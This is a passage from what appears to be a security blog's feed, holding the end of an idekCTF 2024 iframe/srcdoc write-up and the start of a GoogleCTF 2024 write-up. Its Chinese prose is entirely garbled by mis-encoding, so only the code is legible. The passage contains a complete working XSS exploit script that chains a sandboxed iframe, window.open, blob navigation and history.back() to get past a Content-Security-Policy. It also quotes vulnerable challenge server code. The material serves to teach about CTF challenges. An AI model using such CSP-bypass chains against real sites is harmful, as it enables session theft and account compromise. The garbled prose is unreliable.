é¢ï¼Œè€Œæ˜¯ç¹¼æ‰¿æ–¼ history è£¡çš„çµæœï¼Œæ‰æœƒç™¼ç”Ÿé€™ç¨®ç‹€æ³ã€‚</p><p>ç”¨å°ˆæœ‰åè©ä¾†èªªçš„è©±ï¼Œå«åš session history ä»¥åŠ policy containerï¼Œiframe çš„ CSP ä¾†è‡ªæ–¼ policy containerï¼Œè€Œé€™å€‹ policy container çš„å„²å­˜çµæœåˆèˆ‡ session history æœ‰é—œï¼Œä½†å› ç‚ºé€™å…©å€‹å°ˆæœ‰åè©æˆ‘éƒ½æ²’æœ‰æ·±å…¥ç ”ç©¶ï¼Œå› æ­¤å°±ä¸å¤šæäº†ã€‚</p><h3><span id="å…¨éƒ¨åŠ åœ¨ä¸€èµ·">å…¨éƒ¨åŠ åœ¨ä¸€èµ·</span></h3><p>ç¶œåˆä»¥ä¸Šçš„å¹¾é»çµæœï¼Œæˆ‘å€‘çŸ¥é“äº†å¹¾ä»¶äº‹æƒ…ï¼Œç•¶ä½ å›åˆ°ä¸Šä¸€é æ™‚ï¼š</p><ol><li>sandbox å±¬æ€§æ°¸é è·Ÿè‘—æœ€æ–°çš„é é¢</li><li>src æœƒæ˜¯ä¸Šä¸€æ¬¡æœ€å¾Œè¼‰å…¥çš„ç¶²é </li><li>srcdoc çš„ CSP æœƒç¹¼æ‰¿ä¸Šæ¬¡çš„çµæœ</li></ol><p>sandbox çš„è¡Œç‚ºå¾ˆé¡¯ç„¶è·Ÿå¦å¤–å…©è€…ä¸åŒï¼Œå°±åªæœ‰å®ƒè·Ÿè‘—æœ€æ–°çš„é é¢ï¼Œå…¶ä»–å…©å€‹éƒ½è·Ÿè‘—ä¸Šæ¬¡çš„çµæœã€‚</p><p>æ¥è‘—å›é¡§ä¸€ä¸‹é¡Œç›®çš„æ ¸å¿ƒç¨‹å¼ç¢¼ï¼ˆæª¢æŸ¥ opener é‚£å€‹æˆ‘å…ˆæ‹¿æ‰äº†ï¼Œé€™æ¨£æ¯”è¼ƒå¥½ç†è§£æ ¸å¿ƒæ¦‚å¿µï¼‰ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">  &lt;script>  document.head.insertAdjacentHTML(    "beforeend",    \`&lt;meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`  );  &lt;/script>  &lt;iframe srcdoc="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/iframe></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€æ­¥ï¼Œæˆ‘å€‘å…ˆè¼‰å…¥ä¸€å€‹ sandbox iframeï¼Œsrc æœƒæ˜¯æˆ‘å€‘çš„ XSS payloadï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span><span class="token keyword">const</span> xssPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;script>alert(1)&lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe sandbox="allow-same-origin" src="/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>xssPayload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token template-punctuation string">`</span></span><span class="token keyword">const</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ™‚é€™å€‹ win çš„å…§å®¹å°±æœƒæ˜¯ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>    &lt;iframe      sandbox="allow-same-origin"      src="/memo?memo=&lt;script>alert(1)&lt;/script>">    &lt;/iframe>  <span class="token punctuation">'</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ›´æ”¾å¤§ä¸€é»ä¾†çœ‹é‚£å€‹ sandbox iframe çš„è©±ï¼Œé€™å€‹ iframe è£¡é¢çš„å…§å®¹æ˜¯ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!-- ç©ºçš„ headï¼Œæ²’æœ‰ CSP --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>alert(1)&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç”±æ–¼ sandbox çš„ç·£æ•…ï¼Œå› æ­¤ script ä¸æœƒåŸ·è¡Œï¼Œæ‰€ä»¥ä¸æœƒæœ‰ CSPã€‚ä½†ä¹Ÿå› ç‚º sandboxï¼Œæ‰€ä»¥ srcdoc è£¡çš„ script ä¹ŸåŒæ¨£ä¸æœƒåŸ·è¡Œã€‚</p><p>æ¥è‘—æˆ‘å€‘æŠŠç¶²é è·³åˆ°å…¶ä»–é é¢ï¼Œç„¶å¾Œé–‹å•Ÿ <code>/memo?memo=&lt;iframe&gt;&lt;/iframe&gt;</code>ï¼Œé€™æ™‚å€™ cookie ä¸­çš„å…§å®¹æœƒè¢«å–ä»£æ‰ã€‚</p><p>å†åˆ©ç”¨ <code>history.back()</code> å›å»ï¼Œæ­¤æ™‚å¦‚åŒå‰é¢æ‰€è¬›çš„ï¼Œç¶²é æœƒé‡æ–°è¼‰å…¥ï¼Œå› æ­¤ç¶²é çš„ HTML è®Šæˆï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>        &lt;iframe>&lt;/iframe>    <span class="token punctuation">'</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é›–ç„¶çœ‹èµ·ä¾†æ˜¯ç©ºçš„ï¼Œä½†å› ç‚ºä¹‹å‰è¬›éçš„ reparenting è¡Œç‚ºï¼Œå› æ­¤é‚£å€‹ç©ºçš„ iframe çš„å…§å®¹ï¼Œæœƒæ˜¯ä¸Šæ¬¡çš„ <code>/memo?memo=&lt;script&gt;alert(1)&lt;/script&gt;</code>ã€‚</p><p>æ¥è‘—ï¼Œåˆå› ç‚ºä¹‹å‰è¬›éçš„ï¼šã€Œsandbox å±¬æ€§æ°¸é è·Ÿè‘—ç¾åœ¨çš„é é¢ã€çš„ç‰¹æ€§ï¼Œç¾åœ¨é€™å€‹ iframe çš„ sandbox æ²’äº†ã€‚æ—¢ç„¶ sandbox æ²’äº†ï¼Œé‚£å…§å®¹å°±è®Šæˆï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>alert(1)&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åŸæœ¬ CSP æ˜¯ç©ºçš„ï¼Œä½†å› ç‚º sandbox ä¸è¦‹äº†ï¼Œæ‰€ä»¥ç¾åœ¨åˆå›ä¾†äº†ã€‚</p><p>ä½†æ˜¯å‘¢ï¼Œæœ€å¾Œä¹Ÿæ˜¯æœ€é‡è¦çš„ä¸€é»ï¼Œå‰é¢æéçš„ï¼šã€Œsrcdoc çš„ CSP æœƒç¹¼æ‰¿ä¸Šæ¬¡çš„çµæœã€ï¼Œå› æ­¤é€™å€‹ srcdoc çš„ CSP èˆ‡ç•¶å‰é é¢ç„¡é—œï¼Œè€Œæ˜¯ç¹¼æ‰¿ä¸Šæ¬¡çš„ï¼Œè€Œä¸Šæ¬¡çš„ CSP æ˜¯ä»€éº¼ï¼Ÿæ˜¯ç©ºçš„ï¼Œå› æ­¤ script å°±å¯ä»¥åŸ·è¡Œäº†ï¼Œé †åˆ©é”æˆ XSSã€‚</p><p>æŠŠé¡Œç›®çš„ opener æª¢æŸ¥æ‹¿æ‰ä¹‹å¾Œï¼Œexploit æœƒç°¡å–®å¾ˆå¤šï¼Œæ¯”è¼ƒå¥½ç†è§£ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span>  <span class="token keyword">const</span> xssPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;script>alert(document.domain)&lt;\/script></span><span class="token template-punctuation string">`</span></span>  <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe sandbox="allow-same-origin" src="/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>xssPayload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token template-punctuation string">`</span></span>  <span class="token keyword">const</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> win2 <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=&lt;iframe>&lt;/iframe></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      win2<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      win<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;script>          setTimeout(() => &#123;           history.back();          &#125;, 500);        &lt;\/script>      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"text/html"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šå°±æ˜¯é€™é¡Œçš„è§£æ³•ï¼Œä¸»è¦æ˜¯é è‘—å›åˆ°ä¸Šä¸€é æ™‚ï¼Œè¼‰å…¥ sandbox èˆ‡ CSP å…©è€…çš„ä¾†æºä¸åŒï¼Œè—‰æ­¤å‰µé€ å‡ºå·®ç•°ï¼Œé”æˆ XSSã€‚</p><h2><span id="ç¸½çµ">ç¸½çµ</span></h2><p>æ ¹æ“šä½œè€…çš„èªªæ³•ï¼Œé€™ä¸€é¡Œçš„éˆæ„Ÿä¾†æºæ˜¯é€™å€‹ issueï¼š<a href="https://github.com/whatwg/html/issues/6809">srcdoc and sandbox interaction with session history #6809</a>ï¼Œè€Œå¯«é€™ç¯‡çš„æ™‚å€™æˆ‘ä¹Ÿæ˜¯çœ‹äº†é€™å€‹ issue å¥½å¹¾éï¼Œè‡ªå·±åšå¯¦é©—å¾ˆå¤šæ¬¡ï¼Œæ‰çµ‚æ–¼ææ‡‚ç®‡ä¸­å¥§å¦™ï¼Œé‡é»æ˜¯çœ‹å®Œä¹‹å¾Œè¦è‡ªå·±å‹•æ‰‹è©¦è©¦çœ‹ï¼Œå¤šè©¦å¹¾æ¬¡å¤§æ¦‚å°±æœƒçŸ¥é“æ˜¯æ€éº¼ä¸€å›äº‹äº†ã€‚</p><p>è©±èªªé€™å€‹ issue çš„ä½œè€… Jake Archibaldï¼Œå°±æ˜¯ <a href="https://www.youtube.com/playlist?list=PLNYkxOF6rcIAKIQFsNbV0JDws_G_bnNo9">HTTP 203</a> çš„ä¸»æŒäººï¼Œé€™å€‹ç¯€ç›®å°å‰ç«¯å·¥ç¨‹å¸«ä¾†èªªæ‡‰è©²ä¸é™Œç”Ÿï¼Œæœƒè¬›åˆ°å¾ˆå¤šèˆ‡ Web ç›¸é—œçš„è­°é¡Œï¼Œè€Œæœ‰ç¯‡å‰ç«¯å·¥ç¨‹å¸«çš„å¿…è®€ç¶“å…¸ä¹‹ä¸€ï¼š<a href="https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/">Tasks, microtasks, queues and schedules</a> ä¹Ÿæ˜¯ä»–å¯«çš„ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åœ¨ idekCTF 2024 ä¸­ï¼Œç”± icesfont æ‰€å‡ºçš„ä¸€é“é¡Œç›® srcdoc-memos ååˆ†æœ‰è¶£ï¼Œç‰½æ¶‰åˆ°äº†è¨±å¤š iframe çš„ç›¸é—œçŸ¥è­˜ã€‚æˆ‘æ²’æœ‰å¯¦éš›åƒåŠ æ¯”è³½ï¼Œä½†è³½å¾Œçœ‹äº†é¡Œç›®ä»¥åŠè§£æ³•ï¼Œé‚„æ˜¯èŠ±äº†å¥½å¹¾å¤©æ‰çµ‚æ–¼çœ‹æ‡‚ç‚ºä»€éº¼ï¼Œååˆ†å€¼å¾—æŠŠéç¨‹ä»¥åŠè§£æ³•è¨˜éŒ„ä¸‹ä¾†ã€‚&lt;/p&gt;
&lt;p&gt;ç”±æ–¼é€™é¡Œç‰½æ¶‰åˆ°ä¸å°‘èˆ‡ iframe ç›¸é—œçš„çŸ¥è­˜ï¼Œæˆ‘æœƒç›¡é‡ä¸€æ­¥ä¸€æ­¥ä¾†ï¼Œæœƒæ¯”è¼ƒå¥½ç†è§£ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>GoogleCTF 2024 ç­†è¨˜</title>
    <link href="https://blog.huli.tw/2024/06/28/google-ctf-2024-writeup/"/>
    <id>https://blog.huli.tw/2024/06/28/google-ctf-2024-writeup/</id>
    <published>2024-06-28T02:40:00.000Z</published>
    <updated>2024-06-28T12:29:08.155Z</updated>
    
    <content type="html"><![CDATA[<p>é€™åŠå¹´å·¦å³å› ç‚ºæœ‰å…¶ä»–äº‹æƒ…åœ¨å¿™ï¼Œæœ‰æ®µæ™‚é–“æ²’æœ‰å¥½å¥½æ‰“ä¸€å ´ CTF äº†ï¼Œé€™æ¬¡ç‚ºäº† GoogleCTF 2024 é¨°å‡ºæ™‚é–“ï¼Œè·ŸéšŠå‹ä¸€èµ·æŠŠæ‰€æœ‰ web éƒ½è§£æ‰äº†ã€‚</p><p>ç„¶å¾Œé¡Œç›®ä¾èˆŠå¾ˆæœ‰è¶£ï¼Œé€™æ¬¡æœ‰ä¸‰é¡Œæœ‰åƒèˆ‡åˆ°ï¼Œå¦å¤–å…©é¡Œæ¯”è¼ƒç°¡å–®çš„éšŠå‹éƒ½å…ˆè§£æ‰äº†ï¼Œæ²’æ©Ÿæœƒçœ‹ï¼Œä½†é‚„æ˜¯æœƒç¨å¾®åšå€‹ç´€éŒ„ã€‚é›£å¾—æœ‰é€™ç¨®å¹¾ä¹éƒ½æ˜¯ client-side challenge çš„ CTFï¼Œæˆ‘æ˜¯æ»¿å–œæ­¡çš„ã€‚</p><p>é—œéµå­—ï¼š</p><ol><li>URL parser ç¹é</li><li>parseInt å¾Œé¢å¯ä»¥å¸¶å­—ä¸²</li><li>[a-Z] regex æœƒåŒ…å«ç‰¹æ®Šå­—å…ƒ</li><li>cookie tossing</li><li>CSS injection</li></ol><span id="more"></span><h2><span id="grand-prix-heaven-67-solves">GRAND PRIX HEAVEN (67 solves)</span></h2><p>éšŠå‹é€Ÿåº¦å¤ªå¿«ï¼Œé‚„ä¾†ä¸åŠåŠ å…¥å°±è¢«è§£é–‹äº†ã€‚</p><p>æ ¸å¿ƒç¨‹å¼ç¢¼æ˜¯é€™ä¸€æ®µï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/fave/:GrandPrixHeaven"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> grandPrix <span class="token operator">=</span> <span class="token keyword">await</span> Configuration<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">public_id</span><span class="token operator">:</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>GrandPrixHeaven <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>grandPrix<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"ERROR: ID not found"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> defaultData <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token operator">:</span> <span class="token string">"csp"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token operator">:</span> <span class="token string">"retrieve"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token operator">:</span> <span class="token string">"apiparser"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token operator">:</span> <span class="token string">"head_end"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token operator">:</span> <span class="token string">"faves"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token operator">:</span> <span class="token string">"footer"</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> needleBody <span class="token operator">=</span> defaultData<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>grandPrix<span class="token punctuation">.</span>custom <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      needleBody <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>grandPrix<span class="token punctuation">.</span>custom<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>k<span class="token punctuation">,</span> v<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>needleBody<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">TEMPLATE_PIECES</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isNum</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'object'</span><span class="token punctuation">)</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"invalid template piece"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// don't be sneaky. We need a CSP!</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> v <span class="token operator">!=</span> <span class="token string">"csp"</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"No CSP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ERROR IN /fave/:GrandPrixHeaven:\n</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>e<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"invalid custom body"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  needle<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>    <span class="token constant">TEMPLATE_SERVER</span><span class="token punctuation">,</span>    needleBody<span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token literal-property property">multipart</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">boundary</span><span class="token operator">:</span> <span class="token constant">BOUNDARY</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> resp<span class="token punctuation">,</span> body</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ERROR IN /fave/:GrandPrixHeaven:\n</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>e<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"error"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 